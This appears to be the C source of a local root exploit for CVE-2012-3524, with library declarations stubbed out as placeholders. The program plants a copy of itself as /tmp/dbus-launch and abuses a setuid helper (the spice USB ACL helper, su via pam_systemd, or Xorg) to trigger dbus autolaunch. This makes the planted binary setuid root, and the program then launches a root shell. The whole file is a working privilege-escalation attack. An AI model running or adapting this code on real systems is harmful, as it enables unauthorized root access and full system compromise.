
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct stat {int st_mode; } ;
typedef int pid_t ;
typedef int me ;


 int SIGKILL ;
 int chmod (char*,int) ;
 int chown (char*,int ,int ) ;
 int errno ;
 int execve (char*,char**,char**) ;
 int exit (int) ;
 int fflush (int ) ;
 int fork () ;
 char* getenv (char*) ;
 scalar_t__ geteuid () ;
 int kill (int ,int ) ;
 int memset (char*,int ,int) ;
 int printf (char*) ;
 scalar_t__ readlink (char*,char*,int) ;
 int setuid (int ) ;
 int sleep (int) ;
 scalar_t__ stat (char*,struct stat*) ;
 int stdout ;
 int symlink (char*,char*) ;
 int waitpid (int ,int *,int ) ;

int main(int argc, char **argv)
{
 int i = 0;
 struct stat st;
 pid_t pid = 0;
 char *env[] = {
     "PATH=/tmp:/usr/bin:/usr/sbin:/sbin:/bin",
     "DBUS_STARTER_BUS_TYPE=system",
     "DBUS_SYSTEM_BUS_ADDRESS=autolaunch:",
     ((void*)0),
     ((void*)0)
 };



 char *su[] = {"/bin/su", ((void*)0), "blah", ((void*)0)};


 char *spice[] = {"/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper", ((void*)0)};


 char *xorg[] = {"/usr/bin/Xorg", ":7350", ((void*)0)};

 char **a = xorg;
 char *dbus[] = {"/tmp/dbus-launch", ((void*)0)};
 char *sh[] = {"/bin/bash", "--noprofile", "--norc", ((void*)0)};
 char me[0x1000];

 if (geteuid() == 0 && argc > 1) {
  chown("/tmp/dbus-launch", 0, 0);
  chmod("/tmp/dbus-launch", 04755);
  exit(errno);
 } else if (geteuid() == 0) {
  setuid(0);
  execve(*sh, sh, ((void*)0));
  return errno;
 }

 printf("[**] CVE-2012-3524 xSports -- this is not a dbus exploit!\n\n[*] Preparing ...\n");
 memset(me, 0, sizeof(me));

 if (readlink("/proc/self/exe", me, sizeof(me) - 1) < 0) {

  readlink("/proc/self/path/a.out", me, sizeof(me) - 1);
 }
 symlink(me, "/tmp/dbus-launch");

 if (stat(spice[0], &st) == 0) {
  if ((st.st_mode & 04000) == 04000) {
   printf("[+] Using spice helper ...\n");
   a = spice;
  }
 } else if (stat("/lib64/security/pam_systemd.so", &st) == 0) {
  printf("[+] Using pam_systemd helper (type user passwd when asked) ...\n");
  env[3] = "DISPLAY=:7350";
  su[1] = getenv("USER");
  a = su;
 } else if (stat(xorg[0], &st) == 0) {
  if ((st.st_mode & 04000) == 04000)
   printf("[+] Using Xorg helper ...\n");
  else {
   printf("[-] No suitable suid helper found.\n");
   exit(0);
  }
 } else {
  printf("[-] No suitable suid helper found.\n");
  exit(0);
 }

 if ((pid = fork()) == 0) {
  execve(*a, a, env);
  exit(0);
 }

 printf("[*] Waiting 10s for dbus-launch to drop boomshell.\n");

 for (i = 0; i < 10; ++i) {
  sleep(1);
  printf("."); fflush(stdout);
 }
 kill(pid, SIGKILL);
 waitpid(pid, ((void*)0), 0);

 for (;;) {
  stat(*dbus, &st);
  if ((st.st_mode & 04755) == 04755)
   break;
  sleep(1);
 }
 printf("\n[!] Hurra!\n");

 execve(*dbus, dbus, ((void*)0));
 return errno;
}
